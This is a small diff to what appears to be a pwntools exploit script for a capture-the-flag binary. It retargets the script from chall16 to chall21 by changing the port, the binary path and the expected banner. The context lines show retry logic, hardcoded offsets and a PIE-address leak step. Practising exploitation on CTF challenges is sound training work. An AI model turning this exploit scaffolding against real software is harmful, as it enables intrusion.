@@ -4,11 +4,11 @@ import sys
 import time
 
 HOST  = ''
-PORT  = 40016
+PORT  = 40021
 
 NUM_ATTEMPTS = 10
 
-target_elf = ELF('../bin/chall16')
+target_elf = ELF('../bin/chall21')
 
 BASE  = 0xc1d
 STACK = 0x130
@@ -26,7 +26,7 @@ def exploit_attempt():
         else:
             io = target_elf.process(level='warn')
 
-        sys.stdout.write(io.recvuntil(b'5!\n'))
+        sys.stdout.write(io.recvuntil(b'community challenge!\n'))
 
         # step 1: leak PIE address
         io.sendline(b'x'*0x18)
